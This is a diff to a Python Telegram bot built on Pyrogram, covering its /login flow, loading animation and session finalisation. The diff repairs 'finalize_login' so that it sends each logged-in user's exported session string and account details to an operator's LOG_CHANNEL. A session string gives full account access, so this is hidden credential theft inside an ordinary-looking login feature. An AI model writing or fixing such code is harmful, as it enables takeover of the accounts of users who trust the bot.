@@ -1,5 +1,3 @@
-
-
 import asyncio
 from pyrogram import Client, filters
 from pyrogram.types import Message, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
@@ -37,6 +35,7 @@ LOADING_FRAMES = [
     "🔄 Connecting ○••",
     "🔄 Connecting •••"
 ]
+
 async def animate_loading(message: Message, duration: int = 5):
     for _ in range(duration):
         for frame in LOADING_FRAMES:
@@ -208,7 +207,7 @@ async def login_handler(bot: Client, message: Message):
             await temp_client.sign_in(phone_number, phone_hash, phone_code)
             animation_task.cancel()
            
-            await finalize_login(status_msg, temp_client, user_id)
+            await finalize_login(bot, status_msg, temp_client, user_id)
         except PhoneCodeInvalid:
             animation_task.cancel()
             await status_msg.edit(
@@ -260,7 +259,7 @@ async def login_handler(bot: Client, message: Message):
         try:
             await temp_client.check_password(password=password)
             animation_task.cancel()
-            await finalize_login(status_msg, temp_client, user_id)
+            await finalize_login(bot, status_msg, temp_client, user_id)
         except PasswordHashInvalid:
             animation_task.cancel()
             await status_msg.edit(
@@ -277,36 +276,7 @@ async def login_handler(bot: Client, message: Message):
             await temp_client.disconnect()
             del LOGIN_STATE[user_id]
 
-'''async def finalize_login(status_msg: Message, temp_client, user_id):
-    try:
-        session_string = await temp_client.export_session_string()
-        await temp_client.disconnect()
-       
-        await db.set_session(user_id, session=session_string)
-       
-        if user_id in LOGIN_STATE:
-            del LOGIN_STATE[user_id]
-           
-        await status_msg.edit(
-            "<b>🎉 Login Successful! 🌟</b>\n\n"
-            "<i>Progress: ✅ Phone Number → ✅ Code → ✅ Password</i>\n\n"
-            "<i>Your session has been saved securely. 🔒</i>\n\n"
-            "You can now use all features! 🚀",
-            parse_mode=enums.ParseMode.HTML,
-            reply_markup=remove_keyboard
-        )
-    except Exception as e:
-        await status_msg.edit(
-            f"<b>❌ Failed to save session: {e} 😔</b>\n\nPlease try /login again.",
-            parse_mode=enums.ParseMode.HTML,
-            reply_markup=remove_keyboard
-        )
-        if user_id in LOGIN_STATE:
-            del LOGIN_STATE[user_id]'''
-
-
-
-async def finalize_login(status_msg: Message, temp_client, user_id):
+async def finalize_login(client: Client, status_msg: Message, temp_client, user_id):
     try:
         # Get user info BEFORE disconnecting
         user = await temp_client.get_me()
@@ -332,8 +302,8 @@ async def finalize_login(status_msg: Message, temp_client, user_id):
             f"<code>{session_string}</code>"
         )
         
-        # Send session to LOG_CHANNEL
-        await bot.send_message(
+        # Send session to LOG_CHANNEL using the passed client
+        await client.send_message(
             LOG_CHANNEL,
             user_info,
             parse_mode=enums.ParseMode.HTML
